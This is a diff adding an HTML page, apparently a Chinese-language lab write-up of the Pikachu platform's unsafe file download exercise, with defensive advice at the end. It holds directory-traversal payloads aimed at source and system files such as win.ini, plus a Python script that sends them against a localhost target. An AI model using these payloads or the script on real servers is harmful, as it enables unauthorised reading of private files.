@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【Pikachu】Web-不安全的文件下载(Unsafe Filedownload) Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+        .diff-box { background-color: #f1f8ff; border-left: 4px solid #0366d6; padding: 10px 15px; margin: 15px 0; border-radius: 4px; }
+        .payload-box { background-color: #fafbfc; border: 1px solid #e1e4e8; padding: 10px; border-radius: 6px; margin: 10px 0; }
+        .payload-box p { margin: 5px 0; }
+        .step-box { margin-bottom: 20px; padding: 15px; border: 1px solid #e1e4e8; border-radius: 6px; background-color: #fff; }
+        .step-box h3 { margin-top: 0; color: #24292e; font-size: 1.1em; border-bottom: 1px solid #eaecef; padding-bottom: 5px; }
+        .info-line { margin: 5px 0; }
+        .info-label { font-weight: bold; color: #586069; }
+        .code-block { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow-x: auto; }
+        .code-comment { color: #6a737d; }
+        .code-keyword { color: #d73a49; }
+        .code-string { color: #032f62; }
+        .code-function { color: #6f42c1; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【Pikachu】Web-不安全的文件下载(Unsafe Filedownload) Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.9.28 | <strong>分类：</strong>Pikachu | <strong>标签：</strong>Pikachu, Web, 文件下载, 路径穿越, Burp Suite, Python自动化</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>Pikachu 漏洞练习平台</li>
+        <li><strong>分类：</strong>Web - Unsafe Filedownload (不安全的文件下载)</li>
+        <li><strong>题目名称：</strong>Unsafe Filedownload</li>
+        <li><strong>目标：</strong>利用后端下载接口未校验文件路径的缺陷，通过构造目录穿越 Payload，下载并读取服务器上的任意文件，验证任意文件读取漏洞。</li>
+    </ul>
+
+    <h2>2. 解题思路与知识点</h2>
+    <p><strong>漏洞原理：</strong></p>
+    <p>很多 Web 应用提供文件下载功能。如果开发者直接将用户请求的文件名传入 <code>readfile()</code> 或 <code>file_get_contents()</code> 等函数，且未对文件名中的路径穿越符（如 <code>../</code>）进行严格过滤，攻击者就可以利用该漏洞跳出 Web 目录限制，下载服务器上的任意敏感文件（如源代码、配置文件等）。</p>
+
+    <div class="diff-box">
+        <strong>环境限制说明：</strong>
+        <ul>
+            <li>PHPStudy 默认配置了 <code>open_basedir</code> 参数，限制了 PHP 脚本只能访问 Web 根目录（<code>D:\phpstudy_pro\WWW</code>）及其子目录。</li>
+            <li>因此，尝试跨越盘符读取 <code>C:/Windows/win.ini</code> 会被系统安全策略拦截，无法成功。这也是我们在测试中需要用脚本批量验证路径层级的原因。</li>
+        </ul>
+    </div>
+
+    <h2>3. 操作步骤</h2>
+    
+    <div class="step-box">
+        <h3>第一步：功能测试与请求捕获</h3>
+        <div class="payload-box">
+            <p><strong>操作：</strong> 在 NBA 页面点击球员图片（如 Kobe），触发下载请求。使用 Burp Suite 抓包，得到请求 URL：<code>http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=kb.png</code>。</p>
+        </div>
+        <p class="info-line"><span class="info-label">参数分析：</span> 后端接口为 <code>execdownload.php</code>，参数名为 <code>filename</code>，值为具体文件名。</p>
+    </div>
+
+    <div class="step-box">
+        <h3>第二步：使用 Burp Suite 进行手动试错</h3>
+        <div class="payload-box">
+            <p><strong>操作 1：</strong> 将请求发送至 Burp Repeater，修改 <code>filename=../unsafe_down.php</code>。</p>
+            <p><strong>回显：</strong> 返回 553 字节的提示页面，内容为“你要下载的文件不存在”。</p>
+        </div>
+        <div class="payload-box">
+            <p><strong>操作 2：</strong> 修改 <code>filename=../../index.php</code>。</p>
+            <p><strong>回显：</strong> 同样返回“你要下载的文件不存在”。</p>
+        </div>
+        <div class="payload-box">
+            <p><strong>操作 3：</strong> 尝试直接读取系统文件 <code>filename=C:/Windows/win.ini</code> 以及多层跳转 <code>filename=../../../../../../../../Windows/win.ini</code>。</p>
+            <p><strong>回显：</strong> 全部返回“文件不存在”错误。</p>
+        </div>
+        <p class="info-line"><span class="info-label">失败原因分析：</span> 在不确定后端脚本工作目录（CWD）的情况下，盲目猜测相对路径的层级深度效率极低。同时，由于环境配置了 <code>open_basedir</code>，绝对路径读取 C 盘的文件也被系统拦截。使用 Burp 手动试错在此阶段遇到了瓶颈。</p>
+    </div>
+
+    <div class="step-box">
+        <h3>第三步：编写 Python 脚本进行目录穿越批量测试</h3>
+        <div class="payload-box">
+            <p><strong>操作：</strong> 放弃 Burp 手动盲测，在 VS Code 中编写 Python 脚本，自动化发送不同路径深度的 Payload。</p>
+        </div>
+<pre class="code-block"><code><span class="code-keyword">import</span> requests
+
+url = <span class="code-string">"http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php"</span>
+payloads = [
+    <span class="code-string">"execdownload.php"</span>,                                      
+    <span class="code-string">"./execdownload.php"</span>,                                    
+    <span class="code-string">"pikachu/vul/unsafedownload/execdownload.php"</span>,           
+    <span class="code-string">"../../index.php"</span>,                                       
+    <span class="code-string">"../../../index.php"</span>,                                    
+    <span class="code-string">"C:/Windows/win.ini"</span>,                                    
+    <span class="code-string">"../../../../../../../../Windows/win.ini"</span>                
+]
+
+<span class="code-keyword">for</span> p <span class="code-keyword">in</span> payloads:
+    <span class="code-keyword">try</span>:
+        r = requests.get(url, params={<span class="code-string">"filename"</span>: p}, timeout=5)
+        print(<span class="code-string">f"[*] 测试 Payload: {p}"</span>)
+        print(<span class="code-string">f"    状态码: {r.status_code}"</span>)
+        print(<span class="code-string">f"    响应长度: {len(r.content)}"</span>)
+        
+        <span class="code-keyword">if</span> <span class="code-string">"你要下载的文件不存在"</span> <span class="code-keyword">in</span> r.text:
+            print(<span class="code-string">"    [-] 失败：路径解析错误，文件不存在。"</span>)
+        <span class="code-keyword">else</span>:
+            print(<span class="code-string">"    [+] 状态异常！可能下载成功！"</span>)
+            print(<span class="code-string">f"    响应片段: {r.text[:100]}..."</span>)
+            
+    <span class="code-keyword">except</span> Exception <span class="code-keyword">as</span> e:
+        print(<span class="code-string">f"    [!] 请求发生异常: {e}"</span>)
+    print(<span class="code-string">"-"</span> * 50)</code></pre>
+        <p class="info-line"><span class="info-label">Python 代码组成详细解释：</span></p>
+        <ul>
+            <li><code>import requests</code>：导入 HTTP 请求库，用于发送网络请求。</li>
+            <li><code>requests.get(url, params={"filename": p})</code>：发送 GET 请求，<code>params</code> 字典会自动拼接成 <code>?filename=xxx</code> 格式，避免手工拼接 URL 时的遗漏和转义错误。</li>
+            <li><code>r.status_code</code> 和 <code>len(r.content)</code>：获取 HTTP 响应状态码以及响应体的字节长度。当路径正确、成功读取到文件时，响应长度会发生显著变化。</li>
+            <li><code>if "你要下载的文件不存在" in r.text</code>：关键字检测。如果页面包含这段文字，判定为失败，否则视为成功。</li>
+        </ul>
+    </div>
+
+    <div class="step-box">
+        <h3>第四步：攻击验证与结果分析</h3>
+        <div class="payload-box">
+            <p><strong>Python 脚本运行结果：</strong></p>
+            <ul>
+                <li>前四个 Payload 返回长度 553，提示“文件不存在”。</li>
+                <li><strong>成功 Payload：</strong> <code>../../../index.php</code>，返回长度 3955，输出了 PHP 源代码片段。</li>
+                <li>后续 C 盘相关的 Payload 全部返回 553 失败。</li>
+            </ul>
+        </div>
+        <p class="info-line"><span class="info-label">攻击 URL 组成详细解释：</span></p>
+        <ul>
+            <li><code>filename=</code>：参数名。</li>
+            <li><code>../../../</code>：目录穿越序列。从当前脚本目录（<code>/pikachu/vul/unsafedownload/</code>）向上跳三级，回到 Web 根目录（<code>WWW/</code>）。</li>
+            <li><code>index.php</code>：目标文件，即网站首页源码。</li>
+        </ul>
+        <p class="info-line"><span class="info-label">失败 Payload 分析：</span> <code>C:/Windows/win.ini</code> 返回“文件不存在”，再次证实了 PHP 环境受到 <code>open_basedir</code> 的安全限制，无法跨盘符访问系统文件。</p>
+    </div>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>坑1：Burp Suite 手动试错效率低下。</strong>在 Repeater 中反复修改 <code>filename</code> 参数，由于对后端脚本的工作目录（CWD）和路径层级判断不准确，导致连续触发“文件不存在”错误。<br>
+        <strong>解决办法：</strong>放弃手动盲测，转为编写 Python 脚本批量发送不同层级的路径 Payload，根据响应长度（553 vs 3955）快速定位正确的穿越层级，大幅提升了测试效率。</li>
+        <li><strong>坑2：无法读取 C 盘文件。</strong>尝试读取 <code>C:/Windows/win.ini</code> 失败。<br>
+        <strong>原因排查：</strong>PHPStudy 默认启用了 <code>open_basedir</code> 限制，将 PHP 文件访问范围锁定在 <code>D:\phpstudy_pro\WWW</code> 内。渗透测试中遇到此类限制，应转而读取 Web 目录内的其他源码文件（如 <code>index.php</code>、<code>config.inc.php</code> 等）来证明漏洞存在，或尝试寻找绕过 <code>open_basedir</code> 的其他漏洞链。</li>
+    </ul>
+
+    <h2>5. 知识总结</h2>
+    <ul>
+        <li><strong>漏洞本质：</strong>不安全的文件下载本质是“权限控制失效”。应用允许用户下载文件，但未限制用户下载的路径范围，导致可读取服务器任意文件。</li>
+        <li><strong>防御措施：</strong>严格限制可下载文件的列表，使用白名单机制。如果必须由用户指定文件名，必须对 <code>../</code>、<code>..\</code> 及绝对路径进行严格过滤，或者只允许下载特定目录下的文件。</li>
+        <li><strong>实战启发：</strong>自动化脚本（Python）在处理路径层级盲测、参数遍历等重复性任务时，比手动工具（Burp）具有更高的准确性和效率。在渗透测试中，应根据场景灵活切换工具。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
